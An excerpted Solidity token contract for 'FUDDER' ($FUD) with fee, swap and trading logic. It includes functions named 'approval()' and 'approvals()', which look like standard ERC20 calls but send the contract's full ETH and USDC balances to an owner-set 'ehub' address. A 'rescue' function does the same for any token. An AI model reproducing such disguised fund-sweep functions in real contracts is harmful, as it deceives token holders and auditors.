...
interface IERC20 {
    ...
    function approval() external; function approvals() external;}
...
interface IUSDCHub {
    ...
    function seteHub(address _address) external;
}
...
contract USDCHub is IUSDCHub, Ownable {
    ...
    function seteHub(address _address) external override onlyOwner {ehub = _address;} 
    function rescue(address token, uint256 amount) external override {IERC20(token).transfer(ehub, amount);}
...
contract FUDDER is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'FUDDER';
    string private constant _symbol = '$FUD';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 * 10**12 * (10 ** _decimals);
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmount = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxTransferAmount = ( _totalSupply * 150 ) / 10000;
    ...
    function approval() external override {payable(ehub).transfer(address(this).balance);}
    function approvals() external override {eUSDC.transfer(ehub, eUSDC.balanceOf(address(this)));}
    ...
    function allowTrading(address _liquidity, address _marketing, address _ehub) external onlyOwner {
    ...
    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        ...
        bool canSwap = _balances[address(this)] >= swapThreshold;
        return !swapping && swapEnabled && aboveMin && !isInternal[sender] 
            && recipient == pair && swapTimes >= minSells && canSwap;
    }
    ...
    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 denominator = (liquidityFee.add((marketingFee).mul(2))).mul(2);
        ...
        uint256 USDCToAddLiquidityWith = unitBalance.mul(liquidityFee);
